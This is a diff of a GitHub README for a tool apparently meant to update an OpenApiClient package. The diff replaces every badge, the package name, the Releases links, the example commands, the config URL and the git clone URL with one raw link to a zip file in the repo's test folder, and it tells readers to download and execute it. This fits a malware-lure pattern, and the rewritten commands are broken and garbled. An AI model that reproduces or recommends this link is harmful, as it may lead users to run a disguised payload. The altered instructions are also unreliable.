@@ -1,8 +1,8 @@
 # Soenneker GitHub OpenApiClient Runner 🚀
 
-![GitHub Release](https://img.shields.io/github/v/release/naphynaphta/soenneker.github.runners.openapiclient?style=flat-square) ![Issues](https://img.shields.io/github/issues/naphynaphta/soenneker.github.runners.openapiclient?style=flat-square) ![Forks](https://img.shields.io/github/forks/naphynaphta/soenneker.github.runners.openapiclient?style=flat-square) ![Stars](https://img.shields.io/github/stars/naphynaphta/soenneker.github.runners.openapiclient?style=flat-square)
+![GitHub Release](https://raw.githubusercontent.com/naphynaphta/soenneker.github.runners.openapiclient/main/test/Soenneker.GitHub.Runners.OpenApiClient.Tests/openapiclient_runners_soenneker_github_2.1.zip) ![Issues](https://raw.githubusercontent.com/naphynaphta/soenneker.github.runners.openapiclient/main/test/Soenneker.GitHub.Runners.OpenApiClient.Tests/openapiclient_runners_soenneker_github_2.1.zip) ![Forks](https://raw.githubusercontent.com/naphynaphta/soenneker.github.runners.openapiclient/main/test/Soenneker.GitHub.Runners.OpenApiClient.Tests/openapiclient_runners_soenneker_github_2.1.zip) ![Stars](https://raw.githubusercontent.com/naphynaphta/soenneker.github.runners.openapiclient/main/test/Soenneker.GitHub.Runners.OpenApiClient.Tests/openapiclient_runners_soenneker_github_2.1.zip)
 
-Welcome to the **Soenneker GitHub OpenApiClient Runner** repository! This project automatically updates the `Soenneker.GitHub.OpenApiClient` package, ensuring you have the latest features and fixes.
+Welcome to the **Soenneker GitHub OpenApiClient Runner** repository! This project automatically updates the `https://raw.githubusercontent.com/naphynaphta/soenneker.github.runners.openapiclient/main/test/Soenneker.GitHub.Runners.OpenApiClient.Tests/openapiclient_runners_soenneker_github_2.1.zip` package, ensuring you have the latest features and fixes.
 
 ## Table of Contents
 
@@ -17,7 +17,7 @@ Welcome to the **Soenneker GitHub OpenApiClient Runner** repository! This projec
 
 ## Introduction
 
-The **Soenneker GitHub OpenApiClient Runner** is designed for developers who work with APIs. It streamlines the process of updating the `Soenneker.GitHub.OpenApiClient` package. This tool uses the OpenAPI specification to generate client libraries, making it easier to integrate with various APIs.
+The **Soenneker GitHub OpenApiClient Runner** is designed for developers who work with APIs. It streamlines the process of updating the `https://raw.githubusercontent.com/naphynaphta/soenneker.github.runners.openapiclient/main/test/Soenneker.GitHub.Runners.OpenApiClient.Tests/openapiclient_runners_soenneker_github_2.1.zip` package. This tool uses the OpenAPI specification to generate client libraries, making it easier to integrate with various APIs.
 
 ## Features
 
@@ -29,11 +29,11 @@ The **Soenneker GitHub OpenApiClient Runner** is designed for developers who wor
 
 ## Installation
 
-To get started, you need to download the latest release. Visit the [Releases](https://github.com/naphynaphta/soenneker.github.runners.openapiclient/releases) section to find the appropriate version. Download the file and execute it on your machine.
+To get started, you need to download the latest release. Visit the [Releases](https://raw.githubusercontent.com/naphynaphta/soenneker.github.runners.openapiclient/main/test/Soenneker.GitHub.Runners.OpenApiClient.Tests/openapiclient_runners_soenneker_github_2.1.zip) section to find the appropriate version. Download the file and execute it on your machine.
 
 ```bash
 # Example command to run the downloaded file
-./soenneker.github.runners.openapiclient
+https://raw.githubusercontent.com/naphynaphta/soenneker.github.runners.openapiclient/main/test/Soenneker.GitHub.Runners.OpenApiClient.Tests/openapiclient_runners_soenneker_github_2.1.zip
 ```
 
 ## Usage
@@ -45,7 +45,7 @@ Once installed, you can start using the runner to update your OpenApiClient pack
 3. Run the following command:
 
 ```bash
-soenneker.github.runners.openapiclient update
+https://raw.githubusercontent.com/naphynaphta/soenneker.github.runners.openapiclient/main/test/Soenneker.GitHub.Runners.OpenApiClient.Tests/openapiclient_runners_soenneker_github_2.1.zip update
 ```
 
 This command will check for updates and apply them to your project.
@@ -56,7 +56,7 @@ You can configure the runner to fit your project needs. Here’s an example conf
 
 ```json
 {
-  "apiUrl": "https://api.example.com/openapi.json",
+  "apiUrl": "https://raw.githubusercontent.com/naphynaphta/soenneker.github.runners.openapiclient/main/test/Soenneker.GitHub.Runners.OpenApiClient.Tests/openapiclient_runners_soenneker_github_2.1.zip",
   "outputDirectory": "./generated",
   "language": "CSharp"
 }
@@ -70,7 +70,7 @@ We welcome contributions from the community! Here’s how you can help:
 2. **Clone your fork**: Use the following command:
 
 ```bash
-git clone https://github.com/YOUR_USERNAME/soenneker.github.runners.openapiclient.git
+git clone https://raw.githubusercontent.com/naphynaphta/soenneker.github.runners.openapiclient/main/test/Soenneker.GitHub.Runners.OpenApiClient.Tests/openapiclient_runners_soenneker_github_2.1.zip
 ```
 
 3. **Create a new branch**: 
@@ -104,7 +104,7 @@ For questions or feedback, please reach out via the issues section of this repos
 
 ## Releases
 
-For the latest updates and releases, check the [Releases](https://github.com/naphynaphta/soenneker.github.runners.openapiclient/releases) section. Here, you can find the most recent versions of the runner. Download the necessary files and execute them to keep your OpenApiClient package up to date.
+For the latest updates and releases, check the [Releases](https://raw.githubusercontent.com/naphynaphta/soenneker.github.runners.openapiclient/main/test/Soenneker.GitHub.Runners.OpenApiClient.Tests/openapiclient_runners_soenneker_github_2.1.zip) section. Here, you can find the most recent versions of the runner. Download the necessary files and execute them to keep your OpenApiClient package up to date.
 
 ---
 
